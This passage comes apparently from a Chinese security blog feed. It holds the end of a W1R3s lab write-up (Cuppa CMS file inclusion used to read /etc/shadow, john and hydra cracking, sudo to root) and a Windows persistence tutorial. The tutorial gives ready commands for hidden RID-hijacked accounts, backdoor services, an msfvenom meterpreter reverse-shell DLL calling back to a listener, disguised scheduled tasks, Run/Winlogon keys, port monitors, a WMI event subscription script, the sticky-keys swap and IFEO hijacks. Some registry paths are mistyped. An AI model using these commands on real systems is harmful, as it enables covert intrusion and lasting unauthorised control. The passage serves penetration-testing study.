alt="image-20240419234002096"></p><p>这样就好办了，可以去搜一下这个CMS有没有漏洞，难绷搜了一下都是直接指向这个靶场的wp。。</p><p>那这里就学习红队笔记里的搜索方法，用到了<strong>searchsploit</strong>工具</p><blockquote><p><code>searchsploit</code>是一个用于<code>Exploit-DB</code>的命令行搜索工具，可以帮助我们查找渗透模块。</p><p>Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，利用上面提到的命令就可以查找需要的渗透模块，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。</p></blockquote><p>这里copy一下别人翻译的选项，参考文章：<a href="https://juejin.cn/post/7026899204446355486">https://juejin.cn/post/7026899204446355486</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Usage: searchsploit [options] term1 [term2] ... [termN]<br>​<br>==========<br> Examples<br>==========<br>  searchsploit afd windows local<br>  searchsploit -t oracle windows<br>  searchsploit -p 39446<br>  searchsploit linux kernel 3.2 --exclude=&quot;(PoC)|/dos/&quot;<br>​<br>  For more examples, see the manual: https://www.exploit-db.com/searchsploit/<br>​<br>=========<br> Options<br>=========<br>   -c, --case     [Term]      区分大小写(默认不区分大小写)<br>   -e, --exact    [Term]      对exploit标题进行EXACT匹配 (默认为 AND) [Implies &quot;-t&quot;].<br>   -h, --help                 显示帮助<br>   -j, --json     [Term]      以JSON格式显示结果<br>   -m, --mirror   [EDB-ID]    把一个exp拷贝到当前工作目录,参数后加目标id<br>   -o, --overflow [Term]      Exploit标题被允许溢出其列<br>   -p, --path     [EDB-ID]    显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号<br>   -t, --title    [Term]      仅仅搜索漏洞标题（默认是标题和文件的路径）<br>   -u, --update               检查并安装任何exploitdb软件包更新（deb或git）<br>   -w, --www      [Term]      显示Exploit-DB.com的URL而不是本地路径（在线搜索）<br>   -x, --examine  [EDB-ID]    使用$ PAGER检查（副本）Exp<br>       --colour               搜索结果不高亮显示关键词<br>       --id                   显示EDB-ID<br>       --nmap     [file.xml]  使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）<br>                                使用“-v”（详细）来尝试更多的组合<br>       --exclude=&quot;term&quot;       从结果中删除值。通过使用“|”分隔多个值<br>                              例如--exclude=“term1 | term2 | term3”。<br>​<br>=======<br> Notes<br>=======<br> * 你可以使用任意数量的搜索词。<br> * Search terms are not case-sensitive (by default), and ordering is irrelevant.<br>   * 搜索术语不区分大小写(默认情况下)，而排序则无关紧要。<br>   * 如果你想用精确的匹配来过滤结果，请使用用 -e 参数<br> * 使用&#x27; - t &#x27;将文件的路径排除，以过滤搜索结果<br>   * 删除误报(特别是在搜索使用数字时 - i.e. 版本).<br> * 当更新或显示帮助时，搜索项将被忽略。<br></code></pre></td></tr></table></figure><p>那我们就直接搜索cuppa cms相关的漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">searchsploit cuppa cms<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444529.png" alt="image-20240419235101032"></p><p>发现有一条exp我们可以把他下载下来看一下利用方式</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">searchsploit cuppa cms -m 25971<br>cat 25971.txt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444530.png" alt="image-20240419235525664"></p><p>我们看到了关键的利用路径和方式，是一个本地&#x2F;远程文件包含漏洞，外加一个目录穿越，那现在我们就去测试一下</p><p>但是直接使用cuppa的路径是无效的</p><p><img src="http://cdn.clown2024.cn/202407151444531.png" alt="image-20240419235900623"></p><p>联想到我们刚刚的安装页面是administrator&#x2F;installation，猜测cuppa被替换成administrator</p><p><img src="http://cdn.clown2024.cn/202407151444532.png" alt="image-20240420000029674"></p><p>发现能够访问，但是没有东西读回来，我们burp抓包看一下</p><p><img src="http://cdn.clown2024.cn/202407151444533.png" alt="image-20240420000345099"></p><p>发现还是没什么东西，换个请求方式看看</p><p><img src="http://cdn.clown2024.cn/202407151444534.png" alt="image-20240420000423856"></p><p>发现能读了，我们去读一下&#x2F;etc&#x2F;shadow</p><p><img src="http://cdn.clown2024.cn/202407151444535.png" alt="image-20240420000532005"></p><p>发现密码都出来了，我们可以用john去爆破一下，把shadow的内容都copy下来保存成文件</p><p><img src="http://cdn.clown2024.cn/202407151444536.png" alt="image-20240420000813947"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">john pass.txt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444537.png" alt="image-20240420000853870"></p><p>看到两个用户的密码被爆出来了，www-data一般是低权限的用户，我们就去试一下w1r3s这个用户，前面扫出来22的ssh服务，那我们就可以用ssh去连接看看</p><h2><span id="ssh连接">ssh连接</span></h2><p>拿到账户密码之后去ssh连接</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh w1r3s@192.168.20.129<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444538.png" alt="image-20240420001327741"></p><p>成功登陆！</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id #打印真实以及有效的用户和所在组的信息<br>sudo -l #查看有哪些系统权限，列出目前用户可执行与无法执行的指令<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444539.png" alt="image-20240420001652163"></p><p>发现拥有所有sudo权限，那我们就可以直接切换root用户了！</p><p><img src="http://cdn.clown2024.cn/202407151444540.png" alt="image-20240420001824485"></p><p>最后查看root目录下的flag.txt</p><p><img src="http://cdn.clown2024.cn/202407151444541.png" alt="image-20240420001906178"></p><p>成功拿下这台主机！</p><p><strong>hydra</strong></p><p>这里还可以用hydra来爆破ssh，来学习一下</p><blockquote><p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。</p><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/397779150">https://zhuanlan.zhihu.com/p/397779150</a></p></blockquote><p>这里贴一下基本使用语法和参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">语法：Hydra 参数 IP 服务<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">参数：<br>-l login 小写，指定用户名进行破解<br>-L file 大写，指定用户的用户名字典<br>-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。<br>-P file 大写，用于指定密码字典。<br>-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探<br>-M file 指定目标ip列表文件，批量破解。<br>-o file 指定结果输出文件<br>-f 找到第一对登录名或者密码的时候中止破解。<br>-t tasks 同时运行的线程数，默认是16<br>-w time 设置最大超时时间，单位<br>-v / -V 显示详细过程<br>-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）<br>-x 自定义密码。<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">service：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。<br>注意：<br>1.自己创建字典,然后放在当前的目录下或者指定目录。<br>2.参数可以统一放在最后，格式比如hydra ip 服务 参数。<br>3.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。<br>4.缺点，如果目标网站登录时候需要验证码就无法破解。<br>5.man hydra最万能。<br>6.或者hydra -U http-form等查看具体帮助。<br></code></pre></td></tr></table></figure><p>可以先构造一个用户字典用于爆破：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">vim user.list<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444542.png" alt="image-20240420002455502"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">hydra -L user.list -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.20.129<br></code></pre></td></tr></table></figure><p>难绷没跑出来，这我也不知道为什么了，这字典明明很大</p><p><img src="http://cdn.clown2024.cn/202407151444543.png" alt="image-20240420010700256"></p><p>搜了一下发现也是有computer密码的</p><p><img src="http://cdn.clown2024.cn/202407151444544.png" alt="image-20240420010802330"></p><p>然后我把w1r3s放到第一个，跑了好一会终于有了</p><p><img src="http://cdn.clown2024.cn/202407151444545.png" alt="image-20240420012002198"></p><h2><span id="mysql服务">mysql服务</span></h2><p>这里可能会存在没有设置密码直接登陆的情况，可以试一下，不过基本都是不可能的，所以一开始就没想着先试它</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mysql 192.168.20.129 -u root -p <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444546.png" alt="image-20240420002113439"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网权限持久化</title>
      <link href="/2024/04/16/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2024/04/16/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>权限持久化(Persistence，权限维持)技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访间中断的情况发生时保持对系统的访问的技术，如创建系统服务、利用计划任务、滥用系统启动项或注册表、映像劫持、替换或劫持合法代码等。</p><h1><span id="常见系统后门技术">常见系统后门技术</span></h1><h2><span id="创建影子账户">创建影子账户</span></h2><p>就是创建隐藏的用户，无论通过计算机管理还是命令行查询都无法看到，只能在注册表中查到其信息。</p><p>下面是创建影子账户的步骤：</p><ol><li><p>输入下面命令创建一个Hacker$用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user Hacker$ Hacker@123 /add # 创建隐藏用户，$符号代表该用户为隐藏用户<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710500.png" alt="image-20240416212700791"></p><p>不过现在还是可以看到该用户</p><p><img src="http://cdn.clown2024.cn/202407151710502.png" alt="image-20240416213021125"></p><p>此时该用户仍为标准用户，我们还需要进行注册表的修改</p></li><li><p>在注册表编辑器中定位到HKEY_LOCAL_MACHINE\SAM\SAM,单击右键，在弹出的快捷菜单中选择“权限”命令，将 Administrator用户的权限设置为“完全控制”</p><p><img src="http://cdn.clown2024.cn/202407151710503.png" alt="image-20240416213258642"></p></li><li><p>在注册表项 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names处选择 Administrator 用户,在左侧找到与右边显示的键值的类型“0x1f4”相同的目录名</p><p><img src="http://cdn.clown2024.cn/202407151710504.png" alt="image-20240416213805850"></p><p>然后复制000001F4表项的F属性的值</p><p><img src="http://cdn.clown2024.cn/202407151710505.png" alt="image-20240416214222391"></p></li><li><p>找到隐藏用户的相应目录，然后将复制的属性值粘贴到隐藏用户的F属性处。</p><p>以上过程其实是 Hacker$用户劫持了Administrator用户的RID，从而使 Hacker$用户获得 Administrator 用户的权限</p><blockquote><p>这里很怪，在Winserver2012上面创建了账户在注册表没有，只有两个账户，就上图的两个，但是Windows7就全都有</p></blockquote></li><li><p>分别将注册表项“Hacker$”和其对应的目录导出，然后执行下面命令先删除一次用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user Hacker$ /del<br></code></pre></td></tr></table></figure></li><li><p>再将刚刚导出的两个注册表项导入注册表即可创建真正的影子用户。</p></li></ol><h2><span id="系统服务后门">系统服务后门</span></h2><p>对于启动类型为“自动”的系统服务，测试人员可以将服务运行的二进制文件路径设置为后门程序或其他攻击载荷，当系统或服务重启时，可以重新获取对目标主机的控制权。不过，测试人员需要拥有目标主机的管理员权限。</p><p><strong>创建系统服务</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc create Backdoor binpath= &quot;cmd.exe /k C:\Windows\System32\reverse_tcp.exe&quot; start=&quot;auto&quot; obj=&quot;LocalSystem&quot;<br></code></pre></td></tr></table></figure><p>在目标主机上创建一个名为Backdoor 的系统服务，启动类型为“自动”，启动权限为SYSTEM。</p><p><strong>利用现有的系统服务</strong></p><p>通过修改现有服务的配置信息，使服务启动时运行指定的后门程序。测试人员可以通过“sc config”命令修改服务的 binpath选项，也可以尝试修改服务注册表的ImagePath键，二者都直接指定了相应服务的启动时运行的二进制文件</p><p><strong>利用svchost.exe启动服务</strong></p><p>svchost.exe是一个系统进程，是Windows的系统文件。</p><p>官方解释：svchost.exe是从动态链接库(DLL)中运行的服务的通用主机进程名称。该程序本身只是作为服务的宿主，许多系统服务通过注入该程序进程中启动，所以系统中会存在多个该程序的进程。</p><p>在 Windows系统中，需要由svchost.exe进程启动的服务将以 DLL 形式实现。在安装这些服务时，需要将服务的可执行文件路径指向svchost.exe。在启动这些服务时，由svchost.exe 调用相应服务的 DLL 文件，而具体调用哪个 DLL 是由该服务在注册表的信息所决定的。</p><p>以wuauserv服务为例(Windows Update)</p><p><img src="http://cdn.clown2024.cn/202407151710506.png" alt="image-20240416223420143"></p><p>可以看到该服务的可执行文件路径：<code>%systemroot%\system32\svchost.exe -k netsvcs</code>，说明该服务依靠svchost.exe来加载DLL。</p><p>该服务的注册表下还有一个Parameters子项，其中的ServiceDll键值表明该文件由哪个DLL文件负责。</p><p><img src="http://cdn.clown2024.cn/202407151710507.png" alt="image-20240416224101357"></p><p>服务启动时，svchost.exe就会加载该DLL文件。</p><p>注意，系统会根据服务可执行文件路径中的参数对服务进行分组，如C:\Windowssystem32\svchost.exe -k netsvcs 表明该服务属于netsvcs这个服务组。通常，每个 svchost进程负责运行一组服务。因此，并不是每启动一个服务就会增加一个svchost.exe进程。</p><p>所有服务分组可以在注册表的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost中。通过svchost.exe加载启动的服务都要在该表项中注册。</p><p><img src="http://cdn.clown2024.cn/202407151710508.png" alt="image-20240416224711806"></p><p>利用过程：</p><ol><li><p>用Metasploit生成DLL</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f dll -o reverse_tcp.dll<br></code></pre></td></tr></table></figure></li><li><p>将生成的DLL上传到目标主机的System32目录，并执行下面命令安装并配置恶意服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">创建名为 Backdoor的服务，并以svchost加载的方式启动，服务分组为 netsvc</span><br>sc create Backdoor binPath= &quot;C:\Windows\System32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem<br><span class="hljs-meta prompt_">#</span><span class="language-bash">将Backdoor服务启动时加载的DLL为reverse_tcp.dll</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\reverse_tcp.dll&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置服务描述</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v Description /t REG_SZ /d &quot;Windows xxx Service&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置服务显示名称</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v DisplayName /t REG_SZ /d &quot;Backdoor&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建服务新分组，并将Backdoor服务添加进去</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d Backdoor<br></code></pre></td></tr></table></figure></li></ol><p>配置好后，Svchost就会以SYSTEM权限加载恶意DLL，即可上线主机。</p><h2><span id="计划任务后门">计划任务后门</span></h2><p>通过创建计划任务，让服务器定时运行后门程序，实现权限持久化。</p><p>比如在目标主机上创建一个名为Backdoor的计划任务，并在每天八点以SYSTEM权限运行一次后门程序reverse_tcp.exe</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /TN Backdoor /SC daily /ST 8:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F<br></code></pre></td></tr></table></figure><p>计划任务触发后主机就会重新上线</p><p><img src="http://cdn.clown2024.cn/202407151710509.png" alt="image-20240416231100712"></p><p>上图可以看到计划任务以类似文件目录的方式存储，所有计划任务都存储在最内层的目录；所以为了增加隐蔽性，可以依照这个规则来创建计划任务。</p><p>比如这样：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /TN \Microsoft\Windows\AppTask\AppRun /SC daily /ST 8:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710510.png" alt="image-20240416232004716"></p><h2><span id="启动项x2f注册表后门">启动项&#x2F;注册表后门</span></h2><p>测试人员可以通过将后门程序添加到系统启动文件夹或通过注册表运行键引用来进行权限持久化。添加的后门程序将在用户登录的上下文中启动，并且将具有与账户相关联的权限等级。</p><p><strong>系统启动文件夹</strong></p><p>将程序放在启动文件夹中会导致该程序在用户登录时执行。Windows有两种常见的启动文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 位于以下目录的程序将在指定用户登录时启动<br>C:Users\[Username]\AppData\Roaming\Microsoft\Windows\Start<br>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br># 位于以下目录的程序将在所有用户登录时启动<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br></code></pre></td></tr></table></figure><p><strong>运行键(Run Keys)</strong></p><p>Windows 系统上有许多注册表项可以用来设置在系统启动或用户登录时运行指定的程序或加载指定 DLL 文件，测试人员可以对此类注册表进行滥用，以建立持久化后门。</p><p>当用户登录时，系统会依次检查位于注册表运行键(Run Keys)中的程序，并在用户登录的上下文中启动。Windows系统默认创建以下运行键，如果修改HKEY_LOCAL_MACHINE下的运行键，需要拥有管理员级别的权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 以下注册表项中的程序将在当前用户登录时启动<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce<br># 以下注册表项中的程序将在所有用户登录时启动<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br></code></pre></td></tr></table></figure><p>执行下面命令在注册表运行键中添加一个Backdoor键，并将键值执行后门程序的绝对路径</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>用户重新登录时主机就会上线</p><p><strong>Winlogon Helper</strong></p><p>Winlogon 是 Windows 系统的组件,用于处理与用户有关的各种行为，如登录、注销在登录时加载用户配置文件、锁定屏幕等。这些行为由系统注册表管理，注册表中的一些键值定义了在 Windows 登录期间会启动哪些进程。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 指定用户登录时执行的用户初始化程序，默认为userinit.exe<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell<br># 指定Windows身份验证期间执行的程序，默认为explorer.exe<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit<br></code></pre></td></tr></table></figure><p>执行下面命令在Userinit键值中添加一个后门程序，该程序将在用户登录时启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\userinit.exe,reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710511.png" alt="image-20240416234601884"></p><blockquote><p>注意，在滥用 Userinit 和 Shell 键时需要保留键值中的原有程序，将待启动的后门程序添加到原有程序后面，并以“,”进行分隔。并且，后门程序需要被上传至 C:\Windows\System32目录。</p></blockquote><h2><span id="port-monitors">Port Monitors</span></h2><p>打印后台处理服务(PrintSpooler)负责管理 Windows系统的打印作业。与该服务的交互是通过 Print Spooler API执行的,其中包含 AddMonitor函数,用于安装 Port Monitors(本地端口监视器)，并连接配置、数据和监视器文件。AddMonitor函数能够将DLL注入spoolsv.exe 进程，以实现相应功能，并且通过创建注册表键，测试人员可以在目标系统上进行权限持久化。利用该技术需要拥有管理员级别的权限。</p><ol><li><p>通过Metasploit生成一个64位的恶意的DLL</p></li><li><p>将生成的DLL上传到目标主机的C:\Windows\System32目录中，并执行下面命令通过编辑注册表安装一个端口监视器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor&quot; /v &quot;Driver&quot; /t REG_SZ &quot;reverse_tcp.dll&quot;<br></code></pre></td></tr></table></figure></li></ol><p>当系统重启时，Print Spooler 服务在启动过程中会读取Monitors 注册表项的所有子键，并以 SYSTEM 权限加载 Driver 键值所指定的DLL文件，目标主机就会重新上线。</p><h1><span id="事件触发执行">事件触发执行</span></h1><h2><span id="利用wmi事件订阅">利用WMI事件订阅</span></h2><p>WMI可以用于横向移动还可以在以获得权限的主机上部署永久事件，当触发指定事件时执行后门程序。</p><p><strong>手动利用</strong></p><p>通常情况下，WMI事件订阅的需要分别创建事件过滤器(Event Filter)和事件消费者(Event Consumer)，并把二者关联起来，以将事件发生和触发执行绑定一起。</p><p>下面用powershell部署一个事件，在每次系统启动后的5分钟内执行后门程序</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建一个TestFilter的事件过滤器</span><br><span class="hljs-variable">$EventFilterArgs</span> = <span class="hljs-selector-tag">@</span>&#123;<br>    EventNamespace = <span class="hljs-string">&#x27;root/cimv2&#x27;</span><br>    Name = <span class="hljs-string">&quot;TestFilter&quot;</span><br>    Query = <span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent    WITHIN 60 WHERE TargetInstanceISA &#x27;Win32 PerfFormattedData_PerfoS_System&#x27; AND TargetInstance.SystemUpTime &gt;=240 AND TargetInstance.SystemUpTime&lt; 325&quot;</span><br>    QueryLanguage =<span class="hljs-string">&#x27;WQL&#x27;</span><br>&#125;<br><span class="hljs-variable">$EventFilter</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$EventFilterArgs</span><br><span class="hljs-comment"># 创建一个名为TestConsumer的事件消费者，在指定事件发生时执行后门程序</span><br><span class="hljs-variable">$CommandLineEventConsumerArgs</span>= <span class="hljs-selector-tag">@</span>&#123;<br>    Name = <span class="hljs-string">&quot;TestConsumer&quot;</span><br>    CommandLineTemplate = <span class="hljs-string">&quot;cmd.exe /k C:\Windows\System32\reverse_tcp.exe&quot;</span><br>&#125;<br><span class="hljs-variable">$EventConsumer</span> = <span class="hljs-built_in">Set-Wmiinstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$CommandLineEventConsumerArgs</span><br><span class="hljs-comment"># 将事件过滤器和消费者绑定在一起</span><br><span class="hljs-variable">$FilterConsumerBindingArgs</span> = <span class="hljs-selector-tag">@</span>&#123;<br><span class="hljs-keyword">Filter</span> = <span class="hljs-variable">$EventFilter</span><br>Consumer = <span class="hljs-variable">$EventConsumer</span><br>&#125;<br><span class="hljs-variable">$FilterConsumerBinding</span> = <span class="hljs-built_in">Set-Wmiinstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> __FilterToConsumerBinding <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$FilterConsumerBindingArgs</span><br></code></pre></td></tr></table></figure><p><strong>相关辅助工具</strong></p><p>前面用过Sharp-WMIEvent进行系统命令执行，该工具同样可以用于权限持久化，在目标主机上执行下面命令，部署一个随机命名的永久事件，每当用户登录时就执行后门程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>此外，Metasploit框架内置了一个通过 WMI事件订阅在目标系统上实现持久性的模块，即 exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence，支持不同的选项，可用于特定事件触发时在系统上执行任意的攻击载荷</p><p><img src="http://cdn.clown2024.cn/202407151710512.png" alt="image-20240417125624263"></p><h2><span id="利用系统辅助功能">利用系统辅助功能</span></h2><p>Windows 系统包含了许多供用户通过组合键启动的辅助功能，测试人员可以修改这些程序的启动方式，以获取目标主机的命令行或运行指定的后门攻击载荷，不需登录系统即可获取目标主机权限。</p><p>下面是一些常见的辅助功能程序，都位于C:\Windows\System32下面</p><table><thead><tr><th>程序</th><th>功能</th><th>热键组合</th></tr></thead><tbody><tr><td>sethc.exe</td><td>粘滞键</td><td>连续5次Shfit键</td></tr><tr><td>magnify.exe</td><td>放大镜</td><td>Windows+”+”</td></tr><tr><td>utilman.exe</td><td>实用程序</td><td>Windows+U</td></tr><tr><td>osk.exe</td><td>屏幕键盘</td><td>Windows+Ctrl+O</td></tr><tr><td>displaywitch.exe</td><td>屏幕扩展</td><td>Windows+P</td></tr><tr><td>atbroker.exe</td><td>辅助管理工具</td><td></td></tr><tr><td>narrator.exe</td><td>讲述者</td><td>Windows+Ctrl+Enter</td></tr></tbody></table><p>以sethc.exe为例，我们可以将cmd.exe伪装成scthc.exe，然后在远程登陆桌面连按五次shift键即可获得一个命令行窗口，实现未授权访问。该方法需要管理员权限</p><p><strong>手动利用</strong></p><p>在高版本的 Windows中，C:\Windows\System32目录下的文件受到系统保护，只有TrustedInstaller权限的用户才对其中的文件拥有修改和写入权限，可以使用令牌窃取技术获得权限。</p><p><img src="http://cdn.clown2024.cn/202407151710513.png" alt="image-20240417135924293"></p><p>获取 TrustedInstaller权限后，执行以下命令即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd C:\Windows\System32<br>move sethc.exe sethc.exe.bak # 将sethc.exe重命名<br>copy cmd.exe sethc.exe       # 将cmd.exe副本伪装成sethc.exe<br></code></pre></td></tr></table></figure><p><strong>RDP劫持</strong></p><p>通过粘滞键等系统辅助功能创建的后门以SYSTEM 权限运行，测试人员可以在获取的命令行中执行 RDP劫持，不需任何用户凭据即可登入目标系统桌面。</p><h2><span id="ifeo注入">IFEO注入</span></h2><p>IFEO(Image File Execution Options)是Windows系统的一个注册表项,路径为 HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Options。</p><p>在 WindowsNT 系统中，IFEO 原本是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。IFEO 使开发人员能够将调试器附加到应用程序。当进程创建时，应用程序的 IFEO 中设置的调试器将附加到应用程序的名称前，从而有效地在调试器下启动新进程</p><p><strong>Debugger</strong></p><p>当用户启动计算机的程序后，系统会在注册表的IFEO 中查询所有的程序子键，如果存在与该程序名称相同的子健，就读取对应子键的“Debugger”键值。如果该键值未被设置，就默认不做处理，否则直接用该键值所指定的程序路径来代替原始的程序。</p><p>通过编辑“Dubugger”的值，测试人员可以通过修改注册表的方式创建粘滞键后门，而不需获取 TrustedInstaller 权限。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32.exe&quot;<br></code></pre></td></tr></table></figure><p><strong>GlobalFlag</strong></p><p>IFEO还可以在指定程序静默退出时启动任意监控程序，需要通过设置以下3个注册表来实现。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启用对记事本进程的静默退出监视</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Option\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启用Windows错误报告进程WerFault.exe，它将成为reverse_tcp.exe的父进程</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">将监视器进程设置为reverse_tcp.exe</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>当用户打开记事本(notepad.exe)时，程序正常启动。当用户关闭记事本或相关进程被杀死后时，将在 WerFault.exe 